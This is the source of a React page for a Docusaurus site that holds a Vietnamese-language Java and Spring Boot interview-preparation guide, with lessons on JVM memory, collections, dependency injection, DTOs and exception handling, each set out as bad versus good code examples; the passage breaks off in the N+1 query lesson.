import React, { useState, useMemo, useEffect } from 'react';
import Layout from '@theme/Layout';
import Link from '@docusaurus/Link';
import { FIFTY_PRACTICAL_TIPS, PracticalTip } from '../../data/hubFiftyTipsData';
import { INTERVIEW_QUESTIONS, InterviewQuestion } from '../../data/hubInterviewQuestionsData';

// ==========================================
// 1. DATA: KHO TRI THỨC THỰC CHIẾN (DEEP LESSONS)
// ==========================================

interface LessonTopic {
  id: string;
  title: string;
  badge: string;
  summary: string;
  explanation: string;
  asciiDiagram?: string;
  badCodeTitle?: string;
  badCode?: string;
  goodCodeTitle: string;
  goodCode: string;
  interviewTip: string;
}

interface KnowledgeModule {
  id: string;
  title: string;
  icon: string;
  accentColor: string;
  tagline: string;
  topics: LessonTopic[];
}

const KNOWLEDGE_MODULES: KnowledgeModule[] = [
  {
    id: 'core-java',
    title: 'Core Java & Tư Duy Bộ Nhớ',
    icon: '☕',
    accentColor: '#38bdf8',
    tagline: 'Hiểu cội nguồn JVM, quản lý bộ nhớ và cấu trúc dữ liệu để không bao giờ bị đè bug',
    topics: [
      {
        id: 'stack-vs-heap',
        title: '1. Stack vs Heap & Cơ Chế Truyền Tham Trị (Pass-by-Value)',
        badge: 'Cực Kỳ Quan Trọng',
        summary: 'Java lưu trữ biến cục bộ và con trỏ ở Stack, còn dữ liệu thực tế của đối tượng nằm ở Heap. Java LUÔN truyền tham trị (Pass-by-value).',
        explanation: `Trong JVM, bộ nhớ chia làm 2 khu vực chính mà bạn tiếp xúc hàng ngày:
1. **Stack Memory:** Mỗi Thread có một vùng Stack riêng. Dùng để lưu trữ các biến nguyên thủy cục bộ (int, double, boolean...) và các địa chỉ con trỏ (reference) trỏ tới object. Khi hàm chạy xong, Stack Frame bị hủy ngay lập tức, cực kỳ nhanh.
2. **Heap Memory:** Vùng nhớ dùng chung cho toàn bộ ứng dụng. Tất cả các object (kể cả mảng, String, List, hay Entity) đều được cấp phát trên Heap. Vùng này do bộ gom rác (Garbage Collector - GC) quản lý dọn dẹp.

⚠️ **Lầm tưởng kinh điển của sinh viên:** "Java truyền tham chiếu (Pass-by-reference)".
Sự thật: **Java LUÔN LUÔN truyền tham trị (Pass-by-Value)**! Khi bạn truyền một object vào hàm, Java copy **giá trị của địa chỉ con trỏ** chứ không truyền bản thân con trỏ gốc. Do đó:
- Bạn có thể sửa đổi thuộc tính bên trong object: \`user.setName("Nam")\` ➔ Có tác dụng ở ngoài hàm.
- Nhưng nếu bạn gán \`user = new User("Khác")\` ➔ KHÔNG CÓ tác dụng ngoài hàm vì bạn chỉ đang thay đổi bản sao con trỏ nội bộ!`,
        asciiDiagram: `[Thread Stack]                         [Shared Heap Memory]
┌─────────────────────────┐            ┌──────────────────────────────┐
│ Frame: main()           │            │                              │
│  int age = 22;          │            │  User Object:                │
│  User u ───────────────┼───────────>│  { id: 1, name: "Khuong" }    │
└─────────────────────────┘            │                              │
┌─────────────────────────┐            │                              │
│ Frame: modify(User u2)  │            │                              │
│  User u2 (copy ref) ────┼────────────┘                              │
└─────────────────────────┘            └──────────────────────────────┘`,
        badCodeTitle: '❌ Lầm tưởng hàm swap() đổi được 2 đối tượng',
        badCode: `// Sinh viên hay viết:
public void swap(User a, User b) {
    User temp = a;
    a = b;
    b = temp;
    // Ra ngoài hàm: a và b của caller KHÔNG HỀ THAY ĐỔI!
}`,
        goodCodeTitle: '✅ Hiểu đúng bản chất truyền bản sao con trỏ',
        goodCode: `public void updateUserName(User user, String newName) {
    // Sửa thuộc tính bên trong object thành công vì trỏ cùng ô nhớ Heap
    user.setName(newName);
    
    // Gán lại tham chiếu sẽ vô nghĩa với bên ngoài:
    // user = new User("Another"); // ❌ Không ảnh hưởng caller
}`,
        interviewTip: 'Nếu phỏng vấn viên hỏi: "Java là pass-by-value hay pass-by-reference?", hãy trả lời dứt khoát: "Java 100% là pass-by-value. Đối với kiểu tham chiếu (object), giá trị được truyền đi chính là bản sao của địa chỉ ô nhớ (copy of reference address)". Bạn sẽ ghi điểm tuyệt đối!'
      },
      {
        id: 'arraylist-vs-linkedlist',
        title: '2. ArrayList vs LinkedList: Tại Sao 99% Đi Làm Dùng ArrayList?',
        badge: 'Tối Ưu Hiệu Năng',
        summary: 'Ở trường hay dạy LinkedList chèn xóa nhanh O(1), nhưng đi làm 99% ta dùng ArrayList vì CPU Cache Locality.',
        explanation: `Ở trường đại học, thầy cô thường dạy lý thuyết trên giấy:
- \`ArrayList\`: Chèn/xóa ở giữa mảng tốn $O(N)$ vì phải dồn các phần tử còn lại.
- \`LinkedList\`: Chèn/xóa ở giữa tốn $O(1)$ vì chỉ cần đổi con trỏ \`prev\` và \`next\`.

**Thực tế đau lòng khi đi làm:**
1. Để chèn vào vị trí $i$ trong \`LinkedList\`, bạn phải duyệt từ đầu danh sách đến vị trí $i$ ➔ Bản thân việc tìm kiếm đã tốn **$O(N)$** rồi!
2. **CPU Cache Locality (Bộ nhớ đệm CPU):** \`ArrayList\` lưu trữ trên mảng liên tục (contiguous memory). Khi CPU đọc phần tử thứ $0$, phần cứng CPU tự động nạp luôn cả đoạn mảng lân cận vào L1/L2 Cache, giúp việc duyệt mảng nhanh gấp hàng chục lần.
3. \`LinkedList\` lưu trữ mỗi Node phân tán rải rác khắp nơi trên Heap. Duyệt \`LinkedList\` khiến CPU liên tục bị **Cache Miss** (phải chờ nạp từ RAM rất chậm), đồng thời tốn thêm 24 byte bộ nhớ chỉ để chứa 2 con trỏ \`prev\` và \`next\` cho mỗi Node.`,
        badCodeTitle: '❌ Thói quen dùng LinkedList vì nghĩ nó nhanh hơn',
        badCode: `// Nghĩ rằng chèn nhiều thì LinkedList sẽ tối ưu hơn:
List<Transaction> list = new LinkedList<>(); 
for (int i = 0; i < 100_000; i++) {
    list.add(new Transaction(i)); // Tốn cực nhiều RAM và chậm vì GC rác Node!
}`,
        goodCodeTitle: '✅ Luôn ưu tiên ArrayList và cấp phát trước kích thước nếu biết',
        goodCode: `// Khởi tạo ArrayList với initialCapacity ước lượng trước
List<Transaction> list = new ArrayList<>(100_000);
for (int i = 0; i < 100_000; i++) {
    list.add(new Transaction(i)); // Cực nhanh, tận dụng CPU cache liên tục
}`,
        interviewTip: 'Khi được hỏi so sánh ArrayList và LinkedList, hãy nhắc đến từ khóa "CPU Cache Locality" và "Memory Contiguity". Người phỏng vấn sẽ nhận ra bạn có tư duy phần cứng và kỹ sư thực thụ chứ không phải học vẹt lý thuyết trường lớp.'
      },
      {
        id: 'hashmap-internals',
        title: '3. Bản Chất HashMap & Hợp Đồng equals() / hashCode()',
        badge: 'Cực Kỳ Hay Hỏi',
        summary: 'Hiểu cơ chế mảng bucket, giải quyết xung đột bằng Cây Đỏ-Đen và tại sao quên override hashCode() sẽ làm mất dữ liệu.',
        explanation: `HashMap hoạt động dựa trên bảng băm (Hash Table):
1. **Tính vị trí Bucket:** Khi gọi \`map.put(key, value)\`, Java lấy mã băm của key bằng hàm \`key.hashCode()\`. Sau đó dùng phép tính bit: \`index = (n - 1) & hash\` để tìm vị trí bucket trong mảng.
2. **Xung đột băm (Hash Collision):** Nếu hai key khác nhau có cùng \`index\`, chúng sẽ rơi vào cùng một bucket.
   - Java 7: Nối các phần tử thành một Danh sách liên kết đơn (LinkedList). Khi xung đột nhiều, tìm kiếm bị chậm thành $O(N)$.
   - Java 8+: Nếu số phần tử trong 1 bucket $\ge 8$ và tổng dung lượng map $\ge 64$, bucket đó tự động chuyển hóa thành **Cây Đỏ-Đen (Red-Black Tree)**, giúp thời gian tìm kiếm giảm xuống chỉ còn **$O(\log N)$**!
3. **Hợp đồng equals() & hashCode():**
   - Nếu \`a.equals(b) == true\` thì bắt buộc \`a.hashCode() == b.hashCode()\`.
   - Nếu bạn chỉ override \`equals()\` mà quên override \`hashCode()\`: Hai object có cùng nội dung sẽ sinh ra hai mã hash khác nhau. Khi đưa vào Map, object thứ hai rơi vào bucket khác, dẫn đến việc gọi \`map.get(key)\` trả về \`null\` mặc dù key đã tồn tại!`,
        badCodeTitle: '❌ Override equals() nhưng quên hashCode()',
        badCode: `public class CustomerId {
    private String id;
    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (!(o instanceof CustomerId)) return false;
        return Objects.equals(id, ((CustomerId) o).id);
    }
    // ❌ QUÊN override hashCode(): HashMap.get() sẽ trả về NULL!
}`,
        goodCodeTitle: '✅ Luôn override cả hai (hoặc dùng Record trong Java 16+)',
        goodCode: `// Cách 1: Tự động sinh cả hai bằng IDE hoặc Objects.hash()
@Override
public int hashCode() {
    return Objects.hash(id);
}

// Cách 2: Dùng Java Record (tự động có equals/hashCode/toString chuẩn xác 100%)
public record CustomerId(String id) {}`,
        interviewTip: 'Luôn nhớ con số 8 và 64: Khi bucket có 8 node và map size >= 64, HashMap chuyển sang Cây Đỏ-Đen (Treeify). Khi số node giảm xuống 6, nó chuyển ngược lại LinkedList (Untreeify) để tiết kiệm bộ nhớ.'
      },
      {
        id: 'modern-java-features',
        title: '4. Java 8 Đến Java 21: Stream, Optional Đúng Cách & Records',
        badge: 'Cú Pháp Chuẩn Đi Làm',
        summary: 'Không lạm dụng Optional.get(), thay thế class DTO dài dòng bằng Record và viết code phong cách khai báo (Declarative).',
        explanation: `Đi làm hiện nay các công ty đều chạy từ Java 11, 17 đến 21. Những tính năng bạn bắt buộc phải thành thạo:
1. **Optional không phải để thay thế if(obj != null):**
   - ❌ Đừng viết: \`if (opt.isPresent()) { return opt.get(); }\` (viết thế này thì khác gì kiểm tra null thông thường?).
   - ✅ Dùng: \`opt.orElseThrow(() -> new NotFoundException())\` hoặc \`opt.map(...)\`.
   - Phân biệt: \`orElse(new Value())\` (luôn khởi tạo đối tượng dù có null hay không) vs \`orElseGet(() -> new Value())\` (chỉ khởi tạo khi thực sự null - Lazy evaluation).
2. **Records (Java 16+):** Loại bỏ hàng trăm dòng code Getter/Setter/Constructor thừa thãi của DTO. Record bất biến mặc định, an toàn đa luồng.
3. **Stream API:** Xử lý danh sách mang tính khai báo (filter, map, collect) thay cho các vòng lặp for lồng nhau phức tạp.`,
        badCodeTitle: '❌ Dùng Optional nghiệp dư và class DTO cồng kềnh',
        badCode: `// ❌ Biến Optional thành rác rối hơn cả check null:
Optional<User> userOpt = userRepo.findById(id);
if (userOpt.isPresent()) {
    User u = userOpt.get(); // Nếu quên check sẽ văng NoSuchElementException!
    return u.getName();
}
return "Default";`,
        goodCodeTitle: '✅ Dùng Optional chuẩn chỉnh & Record gọn gàng',
        goodCode: `// ✅ Khai báo DTO chỉ trong 1 dòng duy nhất:
public record UserSummaryDto(Long id, String name, String email) {}

// ✅ Xử lý Optional thanh thoát bằng Stream pipeline:
return userRepo.findById(id)
    .map(user -> new UserSummaryDto(user.getId(), user.getName(), user.getEmail()))
    .orElseThrow(() -> new UserNotFoundException(id));`,
        interviewTip: 'Hỏi về Optional: "Khi nào không nên dùng Optional?" ➔ Trả lời: Không dùng Optional làm tham số đầu vào của method, không dùng làm field trong Entity/Class và không bọc Collection vào Optional (hãy trả về List rỗng List.of() thay vì Optional<List>).'
      },
      {
        id: 'jvm-gc-generational',
        title: '5. Quản Lý Bộ Nhớ JVM & Cơ Chế Thu Gom Rác (GC): Young, Old & Metaspace',
        badge: 'Bản Chất Dưới Nắp Ca-pô',
        summary: 'Hiểu Weak Generational Hypothesis, vòng đời Object từ Eden -> Survivor -> Old Gen và cách tránh dính lỗi OutOfMemoryError kinh hoàng.',
        explanation: `Đi làm thực tế, việc ứng dụng bị sập vì **java.lang.OutOfMemoryError (OOM)** hoặc phản hồi chậm chạp do **Stop-The-World (STW)** là cơn ác mộng lớn nhất.
Để cấu hình RAM cho container Docker/Kubernetes và đọc GC log chuẩn chỉ, bạn phải nắm vững cấu trúc bộ nhớ JVM:

1. **Weak Generational Hypothesis (Giả thuyết thế hệ yếu):**
   - 95% các object trong Java có tuổi thọ cực ngắn (sống trong một hàm rồi chết ngay sau khi tính toán xong).
   - Do đó, JVM chia Heap thành 2 thế hệ riêng biệt: **Young Generation** và **Old Generation (Tenured)** để áp dụng thuật toán gom rác tối ưu nhất.

2. **Vòng đời của một đối tượng trên Heap:**
   - **Eden Space:** Nơi mọi object mới sinh ra (\`new\`).
   - Khi Eden đầy ➔ **Minor GC** kích hoạt. Các object còn sống được copy sang Survivor Space 0 (S0) với tuổi (age) = 1.
   - Minor GC tiếp theo: Object sống từ Eden và S0 được dọn sang S1. Hai vùng S0 và S1 hoán đổi luân phiên nhau (FromSpace và ToSpace).
   - Khi tuổi thọ object vượt ngưỡng **MaxTenuringThreshold** (mặc định là 15 lần GC sống sót) ➔ Đối tượng được thăng hạng (Promotion) sang **Old Generation**.
   - Khi Old Gen đầy ➔ **Major GC / Full GC** kích hoạt (STW kéo dài làm đơ ứng dụng).

3. **Metaspace (Native Memory):**
   - Từ Java 8, Metaspace thay thế PermGen, lưu trữ Metadata của Class, Method và hằng số byte-code. Metaspace dùng bộ nhớ RAM thực của hệ điều hành, không nằm trong Java Heap.

4. **3 Nguyên nhân gây rò rỉ bộ nhớ (Memory Leak) phổ biến nhất:**
   - Dùng \`static Collection\` (Map, List) để cache dữ liệu mà không có cơ chế giới hạn kích thước (Eviction / TTL).
   - Quên đóng tài nguyên: Connection, Stream, Socket không dùng \`try-with-resources\`.
   - \`ThreadLocal\` không gọi \`.remove()\` trong môi trường Thread Pool (Tomcat), khiến dữ liệu người dùng cũ bị giữ vĩnh viễn trong RAM.`,
        asciiDiagram: `┌─────────────────────────────────────────────── Java Heap Memory ──────────────────────────────────────────────┐
│                                                                                                               │
│   ┌────────────────────────── Young Generation ──────────────────────────┐   ┌───────── Old Generation ────────┐   │
│   │                                                                      │   │        (Tenured Space)          │   │
│   │   ┌────────────── Eden ──────────────┐  ┌──── S0 ────┐ ┌──── S1 ────┐│   │                                 │   │
│   │   │  Object mới sinh ra (new User)   │  │ Survivor 0 │ │ Survivor 1 ││ ─>│  Object sống lâu (age > 15)     │   │
│   │   │  Minor GC dọn dẹp liên tục       │  │ (FromSpace)│ │  (ToSpace) ││   │  Spring Singletons, Long Cache  │   │
│   │   └──────────────────────────────────┘  └────────────┘ └────────────┘│   │  Full GC dọn dẹp (STW nguy hiểm)│   │
│   └──────────────────────────────────────────────────────────────────────┘   └─────────────────────────────────┘   │
└───────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
  [Metaspace (OS Native RAM)]: Chứa Class Metadata, Method Bytecode, Reflection, Spring CGLIB Proxies`,
        badCodeTitle: '❌ Tạo Memory Leak bằng static collection và ThreadLocal bẩn',
        badCode: `public class MemoryLeakHazards {
    // ❌ RÒ RỈ 1: Static Map lưu không giới hạn -> Sập OOM Heap sau vài ngày chạy!
    private static final Map<String, UserSession> SESSIONS = new HashMap<>();

    // ❌ RÒ RỈ 2: ThreadLocal không remove trong Thread Pool
    private static final ThreadLocal<UserContext> CONTEXT = new ThreadLocal<>();

    public void handleRequest(UserContext ctx) {
        CONTEXT.set(ctx);
        // Quên gọi CONTEXT.remove() trong finally!
        // Tomcat tái sử dụng thread này cho request khác -> lộ data và rò rỉ RAM!
    }
}`,
        goodCodeTitle: '✅ Dùng Cache chuyên dụng có TTL và dọn ThreadLocal chuẩn chỉ',
        goodCode: `public class SafeMemoryPractices {
    // ✅ Sử dụng Caffeine Cache: Tự động xóa bớt khi đầy hoặc hết hạn TTL:
    private final Cache<String, UserSession> sessionCache = Caffeine.newBuilder()
            .maximumSize(10_000)
            .expireAfterWrite(Duration.ofMinutes(30))
            .build();

    // ✅ Luôn giải phóng ThreadLocal trong khối finally:
    public void executeWithContext(UserContext ctx, Runnable task) {
        try {
            UserContextHolder.set(ctx);
            task.run();
        } finally {
            UserContextHolder.clear(); // Bắt buộc gọi ThreadLocal.remove()!
        }
    }
}`,
        interviewTip: 'Khi phỏng vấn hỏi: "Làm thế nào để điều tra lỗi OutOfMemoryError trên Production?", hãy trả lời: "1. Bật flag JVM: -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/dumps để tự động chụp Heap Dump khi sập. 2. Dùng công cụ Eclipse Memory Analyzer (MAT) hoặc VisualVM mở file .hprof, kiểm tra Dominator Tree để tìm xem Class nào đang chiếm 80-90% RAM và xem đường dẫn tham chiếu (Incoming References) để fix tận gốc".'
      }
    ]
  },
  {
    id: 'spring-boot',
    title: 'Spring Boot & Kiến Trúc REST API',
    icon: '🚀',
    accentColor: '#fbbf24',
    tagline: 'Làm chủ Inversion of Control, thiết kế API chuẩn mực và không bao giờ để rò rỉ dữ liệu',
    topics: [
      {
        id: 'constructor-injection',
        title: '1. Tại Sao CẤM Dùng @Autowired Trên Field (Field Injection)?',
        badge: 'Quy Tắc Sống Còn',
        summary: 'Field Injection là nguyên nhân gây khó viết Unit Test, mất tính bất biến (Immutability) và dễ gây lỗi vòng lặp phụ thuộc ngầm.',
        explanation: `Trong các bài hướng dẫn cũ hoặc đồ án sinh viên, bạn thường thấy:
\`\`\`java
@Autowired
private OrderRepository orderRepository;
\`\`\`
Khi đi làm ở các công ty chuyên nghiệp, **Pull Request có dòng code này sẽ bị Senior từ chối merge ngay lập tức!**

**3 Lý do Field Injection bị coi là "Code Mùi" (Code Smell):**
1. **Không thể viết Unit Test thuần túy:** Biến bị đánh dấu \`private\`. Khi viết Unit Test, bạn không thể \`new OrderService()\` rồi truyền repo giả vào được mà bắt buộc phải khởi động cả Spring Context chậm chạp hoặc dùng Reflection bẩn.
2. **Không thể dùng từ khóa \`final\`:** Không có \`final\`, object không thể đảm bảo tính bất biến (Immutability), tiềm ẩn nguy cơ bị ghi đè sau khi khởi tạo.
3. **Che giấu vi phạm Single Responsibility:** Field injection nhìn rất ngắn gọn nên lập trình viên dễ dàng tiêm 10-15 dependencies vào 1 class mà không thấy "ngại". Với Constructor Injection, khi constructor có 8 tham số, bạn sẽ nhận ra class này đang quá tải và cần tách nhỏ.`,
        badCodeTitle: '❌ Field Injection thiếu an toàn',
        badCode: `@Service
public class OrderService {
    @Autowired
    private OrderRepository orderRepository;
    @Autowired
    private PaymentService paymentService;
    // Rất khó viết Unit Test, không thể dùng 'final'!
}`,
        goodCodeTitle: '✅ Constructor Injection kết hợp Lombok @RequiredArgsConstructor',
        goodCode: `@Service
@RequiredArgsConstructor // Lombok tự tạo constructor cho tất cả trường 'final'
public class OrderService {
    private final OrderRepository orderRepository;
    private final PaymentService paymentService;

    // Viết Unit test siêu nhanh và nhẹ nhàng:
    // OrderService service = new OrderService(mockRepo, mockPayment);
}`,
        interviewTip: 'Nếu phỏng vấn viên hỏi: "Làm sao phát hiện lỗi Circular Dependency (A cần B, B cần A) sớm nhất?", hãy trả lời: "Khi dùng Constructor Injection, Spring sẽ ném lỗi BeanCurrentlyInCreationException ngay lúc ứng dụng khởi động (Fail-Fast), trong khi Field Injection có thể giấu lỗi đến tận khi phương thức được gọi lần đầu".'
      },
      {
        id: 'layered-architecture-dto',
        title: '2. Kiến Trúc 3 Tầng Chuẩn & Quy Tắc CẤM Lộ Entity Ra Controller',
        badge: 'Thiết Kế Hệ Thống',
        summary: 'Tách biệt ranh giới Controller - Service - Repository. Luôn dùng Request/Response DTO để bảo vệ cơ sở dữ liệu.',
        explanation: `Một ứng dụng Backend chuyên nghiệp luôn chia thành 4 lớp rõ ràng:
1. **Controller:** Cửa ngõ đón nhận HTTP Request. Chỉ làm nhiệm vụ: parse JSON, kiểm tra tính hợp lệ dữ liệu (@Valid), gọi Service và trả HTTP Response.
2. **Service:** Trái tim hệ thống. Chứa toàn bộ nghiệp vụ, logic tính toán, gọi nhiều Repository, quản lý Transaction (@Transactional).
3. **Repository:** Tầng giao tiếp cơ sở dữ liệu (Spring Data JPA).
4. **DTO (Data Transfer Object):** Đối tượng chuyên chở dữ liệu giữa Client và Server.

🚨 **Tội lỗi lớn nhất của Fresher:** Trả trực tiếp Hibernate Entity ra Controller!
- **Hậu quả 1 (Lộ dữ liệu nhạy cảm):** Entity User chứa cả cột \`password_hash\`, \`role\`, \`token\`. Khi serialize ra JSON, toàn bộ thông tin nhạy cảm này bị gửi về cho phía người dùng!
- **Hậu quả 2 (Lỗi LazyInitializationException):** Khi Jackson cố gắng serialize các quan hệ \`@OneToMany(fetch = LAZY)\`, Hibernate Session đã đóng từ tầng Service, làm nổ lỗi 500 hàng loạt.
- **Hậu quả 3 (Vòng lặp vô tận StackOverflow):** Nếu quan hệ 2 chiều (User có List<Order>, Order có User), Jackson sẽ tuần tự hóa xoay vòng A -> B -> A -> B... cho đến khi server sập vì tràn Stack!`,
        badCodeTitle: '❌ Trả Entity trực tiếp ra ngoài Controller',
        badCode: `@GetMapping("/orders/{id}")
public Order getOrder(@PathVariable Long id) {
    // Nguy hiểm: Lộ schema DB, dễ bị nổ LazyInitializationException!
    return orderRepository.findById(id).orElse(null);
}`,
        goodCodeTitle: '✅ Dùng DTO Response và ResponseEntity chuẩn REST',
        goodCode: `@GetMapping("/orders/{id}")
public ResponseEntity<OrderResponseDto> getOrder(@PathVariable Long id) {
    OrderResponseDto dto = orderService.getOrderById(id);
    return ResponseEntity.ok(dto);
}

// DTO chỉ chứa đúng những trường client cần xem:
public record OrderResponseDto(
    Long orderId,
    BigDecimal totalAmount,
    String status,
    List<OrderItemDto> items
) {}`,
        interviewTip: 'Khi giải thích về DTO, hãy nhấn mạnh: "DTO đóng vai trò như một lớp tường lửa phân tách API Contract (hợp đồng với client) và Database Schema (lược đồ bảng nội bộ). Khi database đổi tên cột, API client bên ngoài không hề bị ảnh hưởng".'
      },
      {
        id: 'global-exception-handling',
        title: '3. Xử Lý Lỗi Toàn Cục Bằng @RestControllerAdvice (RFC 7807)',
        badge: 'Clean Code',
        summary: 'Dẹp bỏ try-catch rải rác ở Controller. Đóng gói lỗi chuyên nghiệp trả về đúng HTTP Status code.',
        explanation: `Đừng bao giờ viết \`try-catch\` trong từng phương thức của Controller. Hãy để Exception văng ra tự nhiên và để một lớp bắt lỗi toàn cục (\`@RestControllerAdvice\`) chịu trách nhiệm đóng gói.

**Chuẩn hóa thông báo lỗi:**
- Lỗi tìm không thấy tài nguyên ➔ Trả về **404 NOT FOUND**.
- Lỗi validate dữ liệu người dùng gửi sai ➔ Trả về **400 BAD REQUEST**.
- Lỗi chưa đăng nhập ➔ Trả về **401 UNAUTHORIZED**.
- Lỗi đã đăng nhập nhưng không có quyền ➔ Trả về **403 FORBIDDEN**.
- Lỗi xung đột dữ liệu (trùng email, duplicate key) ➔ Trả về **409 CONFLICT**.
- Lỗi crash không lường trước ➔ Trả về **500 INTERNAL SERVER ERROR** kèm mã Correlation ID để tra cứu log.`,
        badCodeTitle: '❌ Try-catch thủ công và trả về mã lỗi lung tung',
        badCode: `@PostMapping("/users")
public ResponseEntity<?> createUser(@RequestBody UserDto dto) {
    try {
        userService.save(dto);
        return ResponseEntity.ok("Success");
    } catch (Exception e) {
        // Trả HTTP 200 kèm chuỗi thông báo lỗi ➔ Frontend tưởng thành công!
        return ResponseEntity.ok("Lỗi: " + e.getMessage());
    }
}`,
        goodCodeTitle: '✅ @RestControllerAdvice bắt lỗi tập trung',
        goodCode: `@RestControllerAdvice
@Slf4j
public class GlobalExceptionHandler {

    @ExceptionHandler(ResourceNotFoundException.class)
    public ProblemDetail handleNotFound(ResourceNotFoundException ex) {
        log.warn("Không tìm thấy tài nguyên: {}", ex.getMessage());
        ProblemDetail problem = ProblemDetail.forStatusAndDetail(HttpStatus.NOT_FOUND, ex.getMessage());
        problem.setTitle("Resource Not Found");
        problem.setProperty("timestamp", Instant.now());
        return problem;
    }

    @ExceptionHandler(MethodArgumentNotValidException.class)
    public ProblemDetail handleValidation(MethodArgumentNotValidException ex) {
        Map<String, String> errors = new HashMap<>();
        ex.getBindingResult().getFieldErrors().forEach(f -> errors.put(f.getField(), f.getDefaultMessage()));
        ProblemDetail problem = ProblemDetail.forStatus(HttpStatus.BAD_REQUEST);
        problem.setTitle("Validation Failed");
        problem.setProperty("errors", errors);
        return problem;
    }
}`,
        interviewTip: 'Nhắc đến RFC 7807 (ProblemDetail) trong Spring Boot 3 là một "điểm cộng vàng". Nó chứng minh bạn luôn cập nhật các tiêu chuẩn API hiện đại nhất của ngành.'
      },
      {
        id: 'spring-async-event-driven',
        title: '4. Bất Đồng Bộ Chuẩn Mực: ThreadPoolTaskExecutor & @TransactionalEventListener',
        badge: 'Kiến Trúc Hiệu Năng Cao',
        summary: 'Tuyệt đối cấm dùng @Async với thread pool mặc định SimpleAsyncTaskExecutor. Tách biệt logic gửi mail, notification bằng Event-Driven.',
        explanation: `Khi xây dựng các tính năng như gửi email chào mừng, thông báo đẩy (push notification) hoặc tích hợp bên thứ ba sau khi tạo tài khoản:
Nếu bạn gọi tuần tự trong luồng HTTP chính, người dùng phải chờ 3-5 giây mới nhận được response!

**1. Hiểm họa ngầm khi dùng @Async thiếu cấu hình Thread Pool:**
- Nếu bạn chỉ thêm \`@EnableAsync\` và \`@Async\`, Spring Boot sẽ dùng **SimpleAsyncTaskExecutor**.
- Executor mặc định này **KHÔNG CÓ POOL**! Mỗi lần hàm được gọi, nó lại \`new Thread()\` mới từ hệ điều hành. Khi có 1,000 request ập đến, hệ điều hành cạn kiệt Thread (OS thread exhaustion), gây sập toàn bộ JVM!
- **Bắt buộc:** Khởi tạo một Bean \`ThreadPoolTaskExecutor\` với các thông số: \`corePoolSize\`, \`maxPoolSize\`, \`queueCapacity\` và \`CallerRunsPolicy\`.

**2. Event-Driven Decoupling với ApplicationEventPublisher:**
- Tách tầng Service tạo tài khoản không cần biết đến NotificationService hay LoyaltyPointService.
- Chỉ cần bắn ra 1 Domain Event: \`eventPublisher.publishEvent(new UserRegisteredEvent(user));\`.

**3. Cạm bẫy Transactional:**
- Nếu dùng \`@EventListener\` thông thường, event chạy ngay khi hàm phát ra, **KHI MÀ DATABASE CHƯA COMMIT TRANSACTION**!
- Nếu sau đó DB bị rollback (ví dụ trùng username), khách hàng vẫn nhận được email "Đăng ký thành công" trong khi tài khoản không hề tồn tại trong DB!
- **Giải pháp:** Bắt buộc dùng \`@TransactionalEventListener(phase = TransactionPhase.AFTER_COMMIT)\`!`,
        asciiDiagram: `[HTTP Request] ──> [UserService.register()]
                           │
                           ├── 1. Ghi Database (Transaction Đang Mở)
                           │
                           ├── 2. eventPublisher.publishEvent(UserRegisteredEvent)
                           │         │
                           │         ▼ (Chờ DB commit thành công)
                           └── 3. COMMIT TRANSACTION DATABASE ✅
                                     │
                                     ▼ (Kích hoạt AFTER_COMMIT)
                     [@TransactionalEventListener + @Async]
                                     │
                    [Custom ThreadPool: email-worker-1]
                                     │
                     Gửi Email / Call SMS Gateway / Push Notification`,
        badCodeTitle: '❌ Gọi @Async mặc định & bắn event trước khi commit',
        badCode: `@Service
public class UserService {
    @Autowired private JavaMailSender mailSender;

    @Transactional
    public void register(UserDto dto) {
        userRepo.save(dto.toEntity());
        // ❌ LỖI: Gửi mail đồng bộ chặn luồng HTTP 3 giây, 
        // hoặc nếu DB lỗi rollback ở dưới thì mail đã lỡ gửi đi mất rồi!
        sendWelcomeEmail(dto.email());
        validateKyc(dto); // Nếu dòng này ném Exception -> DB rollback nhưng mail đã gửi!
    }

    @Async // ❌ Không chỉ định Bean name -> Dùng SimpleAsyncTaskExecutor tạo thread vô tội vạ!
    public void sendWelcomeEmail(String email) { ... }
}`,
        goodCodeTitle: '✅ ThreadPoolTaskExecutor chuẩn & @TransactionalEventListener',
        goodCode: `@Configuration
@EnableAsync
public class AsyncConfig {
    @Bean("taskExecutor")
    public Executor taskExecutor() {
        ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor();
        executor.setCorePoolSize(10);
        executor.setMaxPoolSize(50);
        executor.setQueueCapacity(200);
        executor.setThreadNamePrefix("async-worker-");
        // Khi hàng đợi 200 task bị đầy, luồng gọi (Tomcat thread) sẽ tự chạy task để tự hãm tốc độ (Backpressure):
        executor.setRejectedExecutionHandler(new ThreadPoolExecutor.CallerRunsPolicy());
        executor.initialize();
        return executor;
    }
}

@Component
public class UserNotificationListener {
    // ✅ Chỉ chạy sau khi Transaction đã commit 100% thành công vào DB:
    @Async("taskExecutor")
    @TransactionalEventListener(phase = TransactionPhase.AFTER_COMMIT)
    public void onUserRegistered(UserRegisteredEvent event) {
        // Gửi email hoặc bắn Kafka an toàn tuyệt đối
        emailService.sendWelcome(event.email());
    }
}`,
        interviewTip: 'Khi phỏng vấn về kiến trúc Microservices / High Concurrency, hãy giải thích: "Để tránh Distributed Monolith và Coupling, em luôn dùng Domain Events với @TransactionalEventListener(phase = AFTER_COMMIT). Nó đảm bảo tính nhất quán cuối cùng (Eventual Consistency) mà không làm rò rỉ dữ liệu khi transaction rollback".'
      }
    ]
  },
  {
    id: 'jpa-database',
    title: 'JPA, Hibernate & Bệnh N+1 Query',
    icon: '💾',
    accentColor: '#f97316',
    tagline: 'Đặc trị lỗi hiệu năng phổ biến nhất làm sập cơ sở dữ liệu trong các dự án thực tế',
    topics: [
      {
        id: 'n-plus-one-deep-dive',
        title: '1. N+1 Query Problem: Bản Chất & 2 Phương Pháp Đặc Trị',
        badge: '90% Ứng Viên Bị Hỏi',
        summary: 'N+1 là thảm họa khi load 1 danh sách cha rồi chạy thêm N câu query con. Khắc phục bằng JOIN FETCH hoặc @EntityGraph.',
        explanation: `Giả sử bảng \`Department\` (Khoa) có quan hệ \`@OneToMany\` với \`Employee\` (Nhân viên).
Bạn muốn lấy danh sách 100 Khoa và in ra tên các Nhân viên trong từng Khoa.

**Diễn biến của thảm họa N+1:**
1. Hibernate chạy **1 câu query đầu tiên**: \`SELECT * FROM department\` (Lấy được 100 bản ghi).
2. Khi bạn duyệt vòng lặp \`for (Department d : departments)\` và gọi \`d.getEmployees()\`:
